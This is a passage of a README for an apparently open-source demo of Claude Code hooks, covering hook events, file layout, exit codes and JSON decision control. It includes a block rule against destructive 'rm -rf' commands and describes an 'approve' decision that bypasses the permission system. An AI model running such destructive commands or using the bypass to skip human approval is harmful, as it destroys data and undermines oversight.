&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; After successful tool completion&lt;br /&gt; &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;tool_name&lt;/code&gt;, &lt;code&gt;tool_input&lt;/code&gt;, &lt;code&gt;tool_response&lt;/code&gt; with results&lt;/p&gt; 
&lt;h3&gt;4. Notification Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; When Claude Code sends notifications (waiting for input, etc.)&lt;br /&gt; &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;message&lt;/code&gt; content&lt;br /&gt; &lt;strong&gt;Enhanced:&lt;/strong&gt; TTS alerts - "Your agent needs your input" (30% chance includes name)&lt;/p&gt; 
&lt;h3&gt;5. Stop Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; When Claude Code finishes responding&lt;br /&gt; &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;stop_hook_active&lt;/code&gt; boolean flag&lt;br /&gt; &lt;strong&gt;Enhanced:&lt;/strong&gt; AI-generated completion messages with TTS playback (LLM priority: OpenAI &amp;gt; Anthropic &amp;gt; Ollama &amp;gt; random)&lt;/p&gt; 
&lt;h3&gt;6. SubagentStop Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; When Claude Code subagents (Task tools) finish responding&lt;br /&gt; &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;stop_hook_active&lt;/code&gt; boolean flag&lt;br /&gt; &lt;strong&gt;Enhanced:&lt;/strong&gt; TTS playback - "Subagent Complete"&lt;/p&gt; 
&lt;h3&gt;7. PreCompact Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; Before Claude Code performs a compaction operation&lt;br /&gt; &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;trigger&lt;/code&gt; ("manual" or "auto"), &lt;code&gt;custom_instructions&lt;/code&gt; (for manual), session info&lt;br /&gt; &lt;strong&gt;Enhanced:&lt;/strong&gt; Transcript backup, verbose feedback for manual compaction&lt;/p&gt; 
&lt;h3&gt;8. SessionStart Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; When Claude Code starts a new session or resumes an existing one &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;source&lt;/code&gt; ("startup", "resume", or "clear"), session info &lt;strong&gt;Enhanced:&lt;/strong&gt; Development context loading (git status, recent issues, context files)&lt;/p&gt; 
&lt;h3&gt;9. SessionEnd Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; When Claude Code session ends (exit, sigint, or error) &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;session_id&lt;/code&gt;, &lt;code&gt;transcript_path&lt;/code&gt;, &lt;code&gt;cwd&lt;/code&gt;, &lt;code&gt;permission_mode&lt;/code&gt;, &lt;code&gt;reason&lt;/code&gt; &lt;strong&gt;Enhanced:&lt;/strong&gt; Session logging with optional cleanup tasks (removes temp files, stale logs)&lt;/p&gt; 
&lt;h3&gt;10. PermissionRequest Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; When user is shown a permission dialog &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;tool_name&lt;/code&gt;, &lt;code&gt;tool_input&lt;/code&gt;, &lt;code&gt;tool_use_id&lt;/code&gt;, session info &lt;strong&gt;Enhanced:&lt;/strong&gt; Permission auditing, auto-allow for read-only ops (Read, Glob, Grep, safe Bash)&lt;/p&gt; 
&lt;h3&gt;11. PostToolUseFailure Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; When a tool execution fails &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;tool_name&lt;/code&gt;, &lt;code&gt;tool_input&lt;/code&gt;, &lt;code&gt;tool_use_id&lt;/code&gt;, &lt;code&gt;error&lt;/code&gt; object &lt;strong&gt;Enhanced:&lt;/strong&gt; Structured error logging with timestamps and full context&lt;/p&gt; 
&lt;h3&gt;12. SubagentStart Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; When a subagent (Task tool) spawns &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;agent_id&lt;/code&gt;, &lt;code&gt;agent_type&lt;/code&gt;, session info &lt;strong&gt;Enhanced:&lt;/strong&gt; Subagent spawn logging with optional TTS announcement&lt;/p&gt; 
&lt;h3&gt;13. Setup Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; When Claude enters a repository (init) or periodically (maintenance) &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;trigger&lt;/code&gt; ("init" or "maintenance"), session info &lt;strong&gt;Enhanced:&lt;/strong&gt; Environment persistence via &lt;code&gt;CLAUDE_ENV_FILE&lt;/code&gt;, context injection via &lt;code&gt;additionalContext&lt;/code&gt;&lt;/p&gt; 
&lt;h2&gt;What This Shows&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Complete hook lifecycle coverage&lt;/strong&gt; - All 13 hook events implemented and logging (11/13 validated via automated testing)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Prompt-level control&lt;/strong&gt; - UserPromptSubmit validates and enhances prompts before Claude sees them&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Intelligent TTS system&lt;/strong&gt; - AI-generated audio feedback with voice priority (ElevenLabs &amp;gt; OpenAI &amp;gt; pyttsx3)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Security enhancements&lt;/strong&gt; - Blocks dangerous commands and sensitive file access at multiple levels&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Personalized experience&lt;/strong&gt; - Uses engineer name from environment variables&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Automatic logging&lt;/strong&gt; - All hook events are logged as JSON to &lt;code&gt;logs/&lt;/code&gt; directory&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Chat transcript extraction&lt;/strong&gt; - PostToolUse hook converts JSONL transcripts to readable JSON format&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Team-based validation&lt;/strong&gt; - Builder/Validator agent pattern with code quality hooks&lt;/li&gt; 
&lt;/ul&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;strong&gt;Warning:&lt;/strong&gt; The &lt;code&gt;chat.json&lt;/code&gt; file contains only the most recent Claude Code conversation. It does not preserve conversations from previous sessions - each new conversation is fully copied and overwrites the previous one. This is unlike the other logs which are appended to from every claude code session.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h2&gt;UV Single-File Scripts Architecture&lt;/h2&gt; 
&lt;p&gt;This project leverages &lt;strong&gt;&lt;a href="https://docs.astral.sh/uv/guides/scripts/"&gt;UV single-file scripts&lt;/a&gt;&lt;/strong&gt; to keep hook logic cleanly separated from your main codebase. All hooks live in &lt;code&gt;.claude/hooks/&lt;/code&gt; as standalone Python scripts with embedded dependency declarations.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Benefits:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Isolation&lt;/strong&gt; - Hook logic stays separate from your project dependencies&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Portability&lt;/strong&gt; - Each hook script declares its own dependencies inline&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;No Virtual Environment Management&lt;/strong&gt; - UV handles dependencies automatically&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Fast Execution&lt;/strong&gt; - UV's dependency resolution is lightning-fast&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Self-Contained&lt;/strong&gt; - Each hook can be understood and modified independently&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;This approach ensures your hooks remain functional across different environments without polluting your main project's dependency tree.&lt;/p&gt; 
&lt;h2&gt;Key Files&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;.claude/settings.json&lt;/code&gt; - Hook configuration with permissions&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;.claude/hooks/&lt;/code&gt; - Python scripts using uv for each hook type 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;user_prompt_submit.py&lt;/code&gt; - Prompt validation, logging, and context injection&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;pre_tool_use.py&lt;/code&gt; - Security blocking and logging&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;post_tool_use.py&lt;/code&gt; - Logging and transcript conversion&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;post_tool_use_failure.py&lt;/code&gt; - Error logging with structured details&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;notification.py&lt;/code&gt; - Logging with optional TTS (--notify flag)&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;stop.py&lt;/code&gt; - AI-generated completion messages with TTS&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;subagent_stop.py&lt;/code&gt; - Simple "Subagent Complete" TTS&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;subagent_start.py&lt;/code&gt; - Subagent spawn logging with optional TTS&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;pre_compact.py&lt;/code&gt; - Transcript backup and compaction logging&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;session_start.py&lt;/code&gt; - Development context loading and session logging&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;session_end.py&lt;/code&gt; - Session cleanup and logging&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;permission_request.py&lt;/code&gt; - Permission auditing and auto-allow&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;setup.py&lt;/code&gt; - Repository initialization and maintenance&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;validators/&lt;/code&gt; - Code quality validation hooks 
    &lt;ul&gt; 
     &lt;li&gt;&lt;code&gt;ruff_validator.py&lt;/code&gt; - Python linting via Ruff (PostToolUse)&lt;/li&gt; 
     &lt;li&gt;&lt;code&gt;ty_validator.py&lt;/code&gt; - Python type checking (PostToolUse)&lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;utils/&lt;/code&gt; - Intelligent TTS and LLM utility scripts 
    &lt;ul&gt; 
     &lt;li&gt;&lt;code&gt;tts/&lt;/code&gt; - Text-to-speech providers (ElevenLabs, OpenAI, pyttsx3) 
      &lt;ul&gt; 
       &lt;li&gt;&lt;code&gt;tts_queue.py&lt;/code&gt; - Queue-based TTS management (prevents overlapping audio)&lt;/li&gt; 
      &lt;/ul&gt; &lt;/li&gt; 
     &lt;li&gt;&lt;code&gt;llm/&lt;/code&gt; - Language model integrations (OpenAI, Anthropic, Ollama) 
      &lt;ul&gt; 
       &lt;li&gt;&lt;code&gt;task_summarizer.py&lt;/code&gt; - LLM-powered task completion summaries&lt;/li&gt; 
      &lt;/ul&gt; &lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;.claude/status_lines/&lt;/code&gt; - Real-time terminal status displays 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;status_line.py&lt;/code&gt; - Basic MVP with git info&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;status_line_v2.py&lt;/code&gt; - Smart prompts with color coding&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;status_line_v3.py&lt;/code&gt; - Agent sessions with history&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;status_line_v4.py&lt;/code&gt; - Extended metadata support&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;status_line_v5.py&lt;/code&gt; - Cost tracking with line changes&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;status_line_v6.py&lt;/code&gt; - Context window usage bar&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;status_line_v7.py&lt;/code&gt; - Session duration timer&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;status_line_v8.py&lt;/code&gt; - Token usage with cache stats&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;status_line_v9.py&lt;/code&gt; - Minimal powerline style&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;.claude/output-styles/&lt;/code&gt; - Response formatting configurations 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;genui.md&lt;/code&gt; - Generates beautiful HTML with embedded styling&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;table-based.md&lt;/code&gt; - Organizes information in markdown tables&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;yaml-structured.md&lt;/code&gt; - YAML configuration format&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;bullet-points.md&lt;/code&gt; - Clean nested lists&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;ultra-concise.md&lt;/code&gt; - Minimal words, maximum speed&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;html-structured.md&lt;/code&gt; - Semantic HTML5&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;markdown-focused.md&lt;/code&gt; - Rich markdown features&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;tts-summary.md&lt;/code&gt; - Audio feedback via TTS&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;.claude/commands/&lt;/code&gt; - Custom slash commands 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;prime.md&lt;/code&gt; - Project analysis and understanding&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;plan_w_team.md&lt;/code&gt; - Team-based build/validate workflow&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;crypto_research.md&lt;/code&gt; - Cryptocurrency research workflows&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;cook.md&lt;/code&gt; - Advanced task execution&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;update_status_line.md&lt;/code&gt; - Dynamic status updates&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;.claude/agents/&lt;/code&gt; - Sub-agent configurations 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;crypto/&lt;/code&gt; - Cryptocurrency analysis agents&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;team/&lt;/code&gt; - Team-based workflow agents 
    &lt;ul&gt; 
     &lt;li&gt;&lt;code&gt;builder.md&lt;/code&gt; - Implementation agent (all tools)&lt;/li&gt; 
     &lt;li&gt;&lt;code&gt;validator.md&lt;/code&gt; - Read-only validation agent&lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;hello-world-agent.md&lt;/code&gt; - Simple greeting example&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;llm-ai-agents-and-eng-research.md&lt;/code&gt; - AI research specialist&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;meta-agent.md&lt;/code&gt; - Agent that creates other agents&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;work-completion-summary.md&lt;/code&gt; - Audio summary generator&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;logs/&lt;/code&gt; - JSON logs of all hook executions 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;user_prompt_submit.json&lt;/code&gt; - User prompt submissions with validation&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;pre_tool_use.json&lt;/code&gt; - Tool use events with security blocking&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;post_tool_use.json&lt;/code&gt; - Tool completion events&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;post_tool_use_failure.json&lt;/code&gt; - Tool failure events with error details&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;notification.json&lt;/code&gt; - Notification events&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;stop.json&lt;/code&gt; - Stop events with completion messages&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;subagent_stop.json&lt;/code&gt; - Subagent completion events&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;subagent_start.json&lt;/code&gt; - Subagent spawn events&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;pre_compact.json&lt;/code&gt; - Pre-compaction events with trigger type&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;session_start.json&lt;/code&gt; - Session start events with source type&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;session_end.json&lt;/code&gt; - Session end events with reason&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;permission_request.json&lt;/code&gt; - Permission request audit log&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;setup.json&lt;/code&gt; - Setup events with trigger type&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;chat.json&lt;/code&gt; - Readable conversation transcript (generated by --chat flag)&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;ai_docs/&lt;/code&gt; - Documentation resources 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;cc_hooks_docs.md&lt;/code&gt; - Complete hooks documentation from Anthropic&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;claude_code_status_lines_docs.md&lt;/code&gt; - Status line input schema and configuration&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;user_prompt_submit_hook.md&lt;/code&gt; - Comprehensive UserPromptSubmit hook documentation&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;uv-single-file-scripts.md&lt;/code&gt; - UV script architecture documentation&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;anthropic_custom_slash_commands.md&lt;/code&gt; - Slash commands documentation&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;anthropic_docs_subagents.md&lt;/code&gt; - Sub-agents documentation&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;ruff.toml&lt;/code&gt; - Ruff linter configuration for Python code quality&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;ty.toml&lt;/code&gt; - Type checker configuration for Python type validation&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Hooks provide deterministic control over Claude Code behavior without relying on LLM decisions.&lt;/p&gt; 
&lt;h2&gt;Features Demonstrated&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;Prompt validation and security filtering&lt;/li&gt; 
 &lt;li&gt;Context injection for enhanced AI responses&lt;/li&gt; 
 &lt;li&gt;Command logging and auditing&lt;/li&gt; 
 &lt;li&gt;Automatic transcript conversion&lt;/li&gt; 
 &lt;li&gt;Permission-based tool access control&lt;/li&gt; 
 &lt;li&gt;Error handling in hook execution&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Run any Claude Code command to see hooks in action via the &lt;code&gt;logs/&lt;/code&gt; files.&lt;/p&gt; 
&lt;h2&gt;Hook Error Codes &amp;amp; Flow Control&lt;/h2&gt; 
&lt;p&gt;Claude Code hooks provide powerful mechanisms to control execution flow and provide feedback through exit codes and structured JSON output.&lt;/p&gt; 
&lt;h3&gt;Exit Code Behavior&lt;/h3&gt; 
&lt;p&gt;Hooks communicate status and control flow through exit codes:&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Exit Code&lt;/th&gt; 
   &lt;th&gt;Behavior&lt;/th&gt; 
   &lt;th&gt;Description&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;0&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Success&lt;/td&gt; 
   &lt;td&gt;Hook executed successfully. &lt;code&gt;stdout&lt;/code&gt; shown to user in transcript mode (Ctrl-R)&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;2&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Blocking Error&lt;/td&gt; 
   &lt;td&gt;&lt;strong&gt;Critical&lt;/strong&gt;: &lt;code&gt;stderr&lt;/code&gt; is fed back to Claude automatically. See hook-specific behavior below&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Other&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Non-blocking Error&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;stderr&lt;/code&gt; shown to user, execution continues normally&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h3&gt;Hook-Specific Flow Control&lt;/h3&gt; 
&lt;p&gt;Each hook type has different capabilities for blocking and controlling Claude Code's behavior:&lt;/p&gt; 
&lt;h4&gt;UserPromptSubmit Hook - &lt;strong&gt;CAN BLOCK PROMPTS &amp;amp; ADD CONTEXT&lt;/strong&gt;&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Primary Control Point&lt;/strong&gt;: Intercepts user prompts before Claude processes them&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Exit Code 2 Behavior&lt;/strong&gt;: Blocks the prompt entirely, shows error message to user&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Use Cases&lt;/strong&gt;: Prompt validation, security filtering, context injection, audit logging&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Example&lt;/strong&gt;: Our &lt;code&gt;user_prompt_submit.py&lt;/code&gt; logs all prompts and can validate them&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;PreToolUse Hook - &lt;strong&gt;CAN BLOCK TOOL EXECUTION&lt;/strong&gt;&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Primary Control Point&lt;/strong&gt;: Intercepts tool calls before they execute&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Exit Code 2 Behavior&lt;/strong&gt;: Blocks the tool call entirely, shows error message to Claude&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Use Cases&lt;/strong&gt;: Security validation, parameter checking, dangerous command prevention&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Example&lt;/strong&gt;: Our &lt;code&gt;pre_tool_use.py&lt;/code&gt; blocks &lt;code&gt;rm -rf&lt;/code&gt; commands with exit code 2&lt;/li&gt; 
&lt;/ul&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;# Block dangerous commands
if is_dangerous_rm_command(command):
    print("BLOCKED: Dangerous rm command detected", file=sys.stderr)
    sys.exit(2)  # Blocks tool call, shows error to Claude
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;PostToolUse Hook - &lt;strong&gt;CANNOT BLOCK (Tool Already Executed)&lt;/strong&gt;&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Primary Control Point&lt;/strong&gt;: Provides feedback after tool completion&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Exit Code 2 Behavior&lt;/strong&gt;: Shows error to Claude (tool already ran, cannot be undone)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Use Cases&lt;/strong&gt;: Validation of results, formatting, cleanup, logging&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Limitation&lt;/strong&gt;: Cannot prevent tool execution since it fires after completion&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Notification Hook - &lt;strong&gt;CANNOT BLOCK&lt;/strong&gt;&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Primary Control Point&lt;/strong&gt;: Handles Claude Code notifications&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Exit Code 2 Behavior&lt;/strong&gt;: N/A - shows stderr to user only, no blocking capability&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Use Cases&lt;/strong&gt;: Custom notifications, logging, user alerts&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Limitation&lt;/strong&gt;: Cannot control Claude Code behavior, purely informational&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Stop Hook - &lt;strong&gt;CAN BLOCK STOPPING&lt;/strong&gt;&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Primary Control Point&lt;/strong&gt;: Intercepts when Claude Code tries to finish responding&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Exit Code 2 Behavior&lt;/strong&gt;: Blocks stoppage, shows error to Claude (forces continuation)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Use Cases&lt;/strong&gt;: Ensuring tasks complete, validation of final state use this to FORCE CONTINUATION&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Caution&lt;/strong&gt;: Can cause infinite loops if not properly controlled&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;SubagentStop Hook - &lt;strong&gt;CAN BLOCK SUBAGENT STOPPING&lt;/strong&gt;&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Primary Control Point&lt;/strong&gt;: Intercepts when Claude Code subagents try to finish&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Exit Code 2 Behavior&lt;/strong&gt;: Blocks subagent stoppage, shows error to subagent&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Use Cases&lt;/strong&gt;: Ensuring subagent tasks complete properly&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Example&lt;/strong&gt;: Our &lt;code&gt;subagent_stop.py&lt;/code&gt; logs events and announces completion&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;PreCompact Hook - &lt;strong&gt;CANNOT BLOCK&lt;/strong&gt;&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Primary Control Point&lt;/strong&gt;: Fires before compaction operations&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Exit Code 2 Behavior&lt;/strong&gt;: N/A - shows stderr to user only, no blocking capability&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Use Cases&lt;/strong&gt;: Transcript backup, context preservation, pre-compaction logging&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Example&lt;/strong&gt;: Our &lt;code&gt;pre_compact.py&lt;/code&gt; creates transcript backups before compaction&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;SessionStart Hook - &lt;strong&gt;CANNOT BLOCK&lt;/strong&gt;&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Primary Control Point&lt;/strong&gt;: Fires when new sessions start or resume&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Exit Code 2 Behavior&lt;/strong&gt;: N/A - shows stderr to user only, no blocking capability&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Use Cases&lt;/strong&gt;: Loading development context, session initialization, environment setup&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Example&lt;/strong&gt;: Our &lt;code&gt;session_start.py&lt;/code&gt; loads git status, recent issues, and context files&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Advanced JSON Output Control&lt;/h3&gt; 
&lt;p&gt;Beyond simple exit codes, hooks can return structured JSON for sophisticated control:&lt;/p&gt; 
&lt;h4&gt;Common JSON Fields (All Hook Types)&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-json"&gt;{
  "continue": true,           // Whether Claude should continue (default: true)
  "stopReason": "string",     // Message when continue=false (shown to user)
  "suppressOutput": true      // Hide stdout from transcript (default: false)
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;PreToolUse Decision Control&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-json"&gt;{
  "decision": "approve" | "block" | undefined,
  "reason": "Explanation for decision"
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;"approve"&lt;/strong&gt;: Bypasses permission system, &lt;code&gt;reason&lt;/code&gt; shown to user&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;"block"&lt;/strong&gt;: Prevents tool execution, &lt;code&gt;reason&lt;/code&gt; shown to Claude&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;undefined&lt;/strong&gt;: Normal permission flow, &lt;code&gt;reason&lt;/code&gt; ignored&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;PostToolUse Decision Control&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-json"&gt;{
  "decision": "block" | undefined,
  "reason": "Explanation for decision"
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;"block"&lt;/strong&gt;: Automatically prompts Claude with &lt;code&gt;reason&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;undefined&lt;/strong&gt;: No action, &lt;code&gt;reason&lt;/code&gt; ignored&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Stop Decision Control&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-json"&gt;{
  "decision": "block" | undefined,
  "reason": "Must be provided when blocking Claude from stopping"
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;"block"&lt;/strong&gt;: Prevents Claude from stopping, &lt;code&gt;reason&lt;/code&gt; tells Claude how to proceed&lt;/li&gt; 
